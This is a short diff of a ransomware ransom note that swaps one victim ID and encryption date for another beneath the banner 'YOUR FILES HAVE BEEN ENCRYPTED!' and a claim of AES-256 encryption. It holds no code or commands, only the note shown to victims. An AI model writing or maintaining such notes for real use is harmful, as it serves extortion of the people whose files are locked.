@@ -3,8 +3,8 @@
 YOUR FILES HAVE BEEN ENCRYPTED!
 =============================================
 
-Victim ID: 5586a536-fe4a-4cd7-bab2-15429a01abbc
-Encryption Date: 2025-11-27 11:23:34 UTC
+Victim ID: b837958f-d34c-4386-928f-3287dc599f30
+Encryption Date: 2025-12-04 17:32:17 UTC
 
 What Happened?
 - Your files were encrypted with military-grade AES-256 encryption
